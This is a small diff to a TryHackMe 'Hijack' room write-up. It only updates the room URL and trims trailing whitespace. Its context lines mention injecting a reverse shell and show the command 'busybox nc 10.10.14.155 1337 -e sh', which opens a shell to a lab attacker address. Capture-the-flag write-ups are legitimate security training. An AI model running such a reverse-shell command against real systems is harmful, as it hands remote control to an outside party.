@@ -1,6 +1,6 @@
 # Hijack
 
-A writeup for the room [Hijack](https://tryhackme.com/room/hijack) on TryHackMe.
+A writeup for the room [Hijack](https://tryhackme.com/r/room/hijack) on TryHackMe.
 
 > Misconfigs conquered, identities claimed.
 
@@ -247,7 +247,7 @@ We can try to inject a reverse shell command.
 
 [https://www.revshells.com/](https://www.revshells.com/)
 
-The first one that works without any modification is the following: 
+The first one that works without any modification is the following:
 
 ```sh
 busybox nc 10.10.14.155 1337 -e sh
